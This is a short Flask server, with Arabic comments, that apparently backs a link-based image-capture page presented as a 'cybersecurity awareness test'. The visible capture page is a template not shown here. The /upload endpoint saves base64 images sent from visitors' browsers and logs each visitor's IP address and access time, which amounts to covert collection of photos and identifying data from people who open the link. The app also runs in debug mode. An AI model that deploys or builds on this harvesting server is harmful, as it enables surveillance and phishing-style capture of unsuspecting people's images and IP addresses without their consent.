from flask import Flask, request, render_template
import base64
import datetime

app = Flask(__name__)

# تخزين بيانات المستخدمين الذين دخلوا إلى الرابط
logs = []

@app.route('/')
def home():
    return "مرحبًا بك في اختبار التوعية بالأمن السيبراني!"

@app.route('/capture')
def capture_page():
    return render_template('index.html')  # عرض صفحة HTML

@app.route('/upload', methods=['POST'])
def upload_image():
    data = request.json.get('image')
    user_ip = request.remote_addr  # الحصول على عنوان IP للمستخدم
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # تسجيل وقت الدخول

    if data:
        image_data = data.replace('data:image/png;base64,', '')
        filename = f"captured_{timestamp.replace(':', '-')}.png"

        with open(filename, "wb") as f:
            f.write(base64.b64decode(image_data))

        logs.append({"ip": user_ip, "time": timestamp, "file": filename})
        return f"تم حفظ الصورة بنجاح! IP: {user_ip}, وقت الدخول: {timestamp}"
    
    return "لم يتم استلام أي بيانات!"

if __name__ == '__main__':
    app.run(debug=True)
